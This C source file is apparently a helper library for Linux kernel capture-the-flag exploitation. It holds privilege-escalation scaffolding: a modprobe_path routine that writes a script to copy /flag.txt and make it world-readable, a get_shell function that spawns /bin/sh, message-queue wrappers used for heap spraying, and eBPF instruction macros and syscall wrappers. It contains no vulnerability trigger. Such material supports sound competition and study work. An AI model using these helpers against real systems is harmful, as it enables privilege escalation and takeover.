#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <errno.h>
#include <assert.h>
#include <poll.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <linux/userfaultfd.h>
#include <linux/bpf.h>
#include <linux/bpf_common.h>

// types
typedef unsigned long ulong;
typedef unsigned int uint;
typedef unsigned short ushort;
typedef unsigned char uchar;

typedef uint64_t u64;
typedef int64_t i64;
typedef uint32_t u32;
typedef int32_t i32;
typedef uint16_t u16;
typedef int16_t i16;
typedef uint8_t u8;
typedef int8_t i8;

// better logging
#define INFO "[*] "
#define SUCCESS "[+] "
#define FAIL "[-] "
#define WARN "[!] "
#define ERROR "[x] "

#define ptr_to_u64(ptr) ((uint64_t)(unsigned long) (ptr))
#define u64_to_ptr(u64) ((void*)(u64))

#define PAGE_SIZE 0x1000

#define WAIT getchar()

void debug(const char *msg) 
{
    puts(msg);
    getchar();
}

void panic(const char *msg)
{
    puts(msg);
    exit(-1);
}

void dump_output(ulong *buff, ulong size)
{
    int i,j;

    for (i = 0; i < size/8; i++)
    {
        if ((i % 2) == 0)
        {
            if (i != 0)
                printf("  \n");

            printf("  0x%04x  ", i*8);
        }

        ulong ptr = ((ulong *)(buff))[i];
        printf("0x%016lx", ptr);
        printf("    ");
    }
    printf("\n");
}

void read_flag(const char *flag_path) 
{
    puts("[*] return to userland, calling read_flag()");
    char flag[100];
    read(open(flag_path, O_RDONLY), flag, 100);
    puts(flag);
}

void get_shell(void) 
{
    puts("[*] return to userland, calling get_shell()");
    system("/bin/sh");
}

// might need to modify depend on challenge environment
// TODO: this shit need a better implementation
void prepare_modprobe_path(void)
{
    puts("[*] prepare modprobe path");

    system("echo -ne '#!/bin/sh\n/bin/cp /flag.txt /home/ctf/flag\n/bin/chmod 777 /home/ctf/flag' > /home/ctf/copy.sh");
    system("chmod +x /home/ctf/copy.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/ctf/dummy");
    system("chmod +x /home/ctf/dummy");

}

void trigger_modprobe_path(const char* script_path)
{
    puts("[*] Triggering modprobe_path script!");
    system(script_path);
}

void bswap(unsigned long val) 
{
    asm(
        "bswap %1;"
        : "=r" (val)
        : "r" (val));
}

i32 open_dev(const char *device_path)
{
    int fd;
    fd = open(device_path, O_RDWR);
    if (fd < 0) {
        panic("[!] Error when opening device!");
    }

    return fd;
}

void get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg)
{
    if (msgrcv(msqid, msgp, msgsz, msgtyp, msgflg) < 0)
    {
        perror("msgrcv");
        exit(-1);
    }
    return;
}

void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg)
{
    if (msgsnd(msqid, msgp, msgsz, msgflg) == -1)
    {
        perror("msgsend failure");
        exit(-1);
    }
    return;
}

int32_t make_queue(key_t key, int msgflg)
{
    int32_t result;
    if ((result = msgget(key, msgflg)) == -1) 
    {
        perror("msgget failure");
        exit(-1);
    }
    return result;
}

/**************************************** EBPF *********************************************/

#ifndef __NR_BPF
#define __NR_BPF 321
#endif

#define LOG_BUF_SIZE 0x20000

// varies from userspace bpf_map_info definition so need to redefine
struct bpf_map_info_kernel
{
    __u32 type;
    __u32 id;
    __u32 key_size;
    __u32 value_size;
    __u32 max_entries;
    __u32 map_flags;
    char  name[BPF_OBJ_NAME_LEN];
    __u32 ifindex;
    __u32 btf_vmlinux_value_type_id;
    __u64 netns_dev;
    __u64 netns_ino;
    __u32 btf_id;
    __u32 btf_key_type_id;
    __u32 btf_value_type_id;
} __attribute__((aligned(8)));

// add ebpf macros here
#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){                        \
    .code = CODE,                          \
    .dst_reg = DST,                        \
    .src_reg = SRC,                        \
    .off = OFF,                            \
    .imm = IMM})

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)    \
    ((struct bpf_insn){                    \
    .code = BPF_LD | BPF_DW | BPF_IMM, \
    .dst_reg = DST,                    \
    .src_reg = SRC,                    \
    .off = 0,                          \
    .imm = (__u32)(IMM)}),             \
    ((struct bpf_insn){                \
    .code = 0,                     \
    .dst_reg = 0,                  \
    .src_reg = 0,                  \
    .off = 0,                      \
    .imm = ((__u64)(IMM)) >> 32})

#define BPF_MOV64_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)
#define BPF_MOV_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_X, DST, SRC, 0, 0)
#define BPF_MOV64_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)
#define BPF_MOV_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)
#define BPF_RSH_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_RSH | BPF_X, DST, SRC, 0, 0)
#define BPF_LSH_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_LSH | BPF_K, DST, 0, 0, IMM)
#define BPF_ALU64_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)
#define BPF_ALU64_REG(OP, DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)
#define BPF_ALU_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)
#define BPF_JMP_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)
#define BPF_JMP_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)
#define BPF_JMP32_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)
#define BPF_JMP32_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)
#define BPF_EXIT_INSN() BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)
#define BPF_LD_MAP_FD(DST, MAP_FD) BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_LD_IMM64(DST, IMM) BPF_LD_IMM64_RAW(DST, 0, IMM)
#define BPF_ST_MEM(SIZE, DST, OFF, IMM) BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)
#define BPF_STX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_GET_MAP(fd, idx) \
        BPF_LD_MAP_FD(BPF_REG_1, fd), \
        BPF_MOV64_IMM(BPF_REG_2, idx), \
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_2, -4),  \
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), \
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), \
        BPF_EXIT_INSN()

char bpf_log_buf[LOG_BUF_SIZE] = {0};

int bpf_prog_load(union bpf_attr* map_attr)
{
    return syscall(__NR_BPF, BPF_PROG_LOAD, map_attr, sizeof(*map_attr));
}

int bpf_create_map(union bpf_attr* map_attr)
{
    return syscall(__NR_BPF, BPF_MAP_CREATE, map_attr, sizeof(*map_attr));
}

int bpf_lookup_elem(int fd, u64 key, const void *value)
{
    union bpf_attr attr = {
        .map_fd = (u32) fd,
        .key = (u64) &key,
        .value = (u64) value,
    };

    return syscall(__NR_BPF, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

int bpf_update_elem(int fd, u64 key, const void *value, size_t flags)
{
    union bpf_attr attr = {
        .map_fd = (u32) fd,
        .key = (u64) &key,
        .value = (u64) value,
        .flags = flags,
    };

    return syscall(__NR_BPF, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

int bpf_delete_elem(int fd, const void *key)
{
    union bpf_attr attr = {
        .map_fd = (u32) fd,
        .key = ptr_to_u64(key),
        .flags = 0,
    };

    return syscall(__NR_BPF, BPF_MAP_DELETE_ELEM, &attr, sizeof(attr));
}

int obj_get_info_by_fd(union bpf_attr *map_attr)
{
    return syscall(__NR_BPF, BPF_OBJ_GET_INFO_BY_FD, map_attr, sizeof(*map_attr));
}

int map_get_next_key(union bpf_attr* map_attr)
{
    return syscall(__NR_BPF, BPF_MAP_GET_NEXT_KEY, map_attr, sizeof(*map_attr));
}
